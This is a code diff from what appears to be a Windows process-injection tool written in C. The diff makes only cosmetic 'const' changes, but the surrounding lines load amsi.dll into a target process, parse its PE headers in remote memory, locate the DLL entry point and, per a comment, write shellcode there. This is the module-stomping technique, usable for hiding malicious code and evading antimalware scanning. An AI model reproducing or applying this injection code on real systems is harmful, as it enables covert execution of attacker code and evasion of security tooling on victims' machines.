@@ -15,10 +15,10 @@ int main()
 	HANDLE					hProcess = NULL;
 	HANDLE					hDllThread = NULL;
 	FARPROC					llLoadLibraryWAddress;
-	const SIZE_T			cbModulesSize = sizeof(lphModule);
+	CONST SIZE_T			cbModulesSize = sizeof(lphModule);
 	DWORD					dwPid;
 	DWORD					dwModulesSizeNeeded = 0;
-	const DWORD				headerBufferSize = 0x1000;
+	CONST DWORD				headerBufferSize = 0x1000;
 	SIZE_T					ullModulesCount;
 	CHAR					cRemoteModuleName[128] = { 0 };
 	WCHAR					cModuleToInject[] = L"C:\\windows\\system32\\amsi.dll";
@@ -74,9 +74,9 @@ Continue:
 
 			ReadProcessMemory(hProcess, hRemoteModule, lpTargetProcessHeaderBuffer, headerBufferSize, NULL);
 
-			PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;
-			PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + dosHeader->e_lfanew);
-			LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);
+			CONST PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpTargetProcessHeaderBuffer;  // NOLINT(misc-misplaced-const)
+			CONST PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpTargetProcessHeaderBuffer + dosHeader->e_lfanew);
+			CONST LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)hRemoteModule);  // NOLINT(misc-misplaced-const)
 			printf("[*] Dll entryPoint at: %p\n", dllEntryPoint);
 
 			// write shellcode to DLL's AddressofEntryPoint
